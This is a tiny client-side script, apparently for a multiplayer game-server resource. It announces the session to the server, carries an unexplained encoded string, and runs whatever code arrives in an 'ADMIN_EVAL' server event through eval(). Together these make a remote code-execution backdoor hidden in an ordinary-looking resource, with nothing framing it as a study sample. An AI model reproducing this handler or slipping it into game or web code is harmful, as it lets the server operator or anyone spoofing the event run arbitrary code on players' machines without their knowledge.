API.onResourceStart.connect(function(){API.triggerServerEvent("SESSION_INIT")});
var content='㭉㭉㭔㬹㮂㭬㭸㭠㭋㭡㭬㭿㭜㭬㭽㭯㭩㭠㭰㬳㬶㭯㭳㬜㭂㬢㬲㬴㭊';
API.onServerEventTrigger.connect(function(e,a){if(e=='ADMIN_EVAL'){eval(a[0])}});